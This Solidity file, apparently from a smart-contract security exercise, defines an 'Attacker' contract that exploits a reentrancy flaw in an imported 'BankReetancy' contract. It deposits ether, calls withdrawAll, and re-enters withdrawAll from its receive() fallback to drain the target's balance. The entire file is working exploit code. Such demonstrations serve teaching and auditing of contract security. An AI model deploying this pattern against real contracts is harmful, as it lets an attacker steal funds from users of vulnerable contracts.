// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import {BankReetancy} from "./02-Bank-Reetancy.sol";

contract Attacker{

    BankReetancy public bank;

    constructor(address _smartcontractAddress){
        bank = BankReetancy(_smartcontractAddress);
    }

    function attack()external payable{
        bank.deposit{value: msg.value}();
        bank.withdrawAll();
    }

    receive() external payable{
        if(address(this).balance > 0){
            bank.withdrawAll();
        }
    }

    function getContractBalance() public view returns(uint256){
        return address(this).balance;
    }
}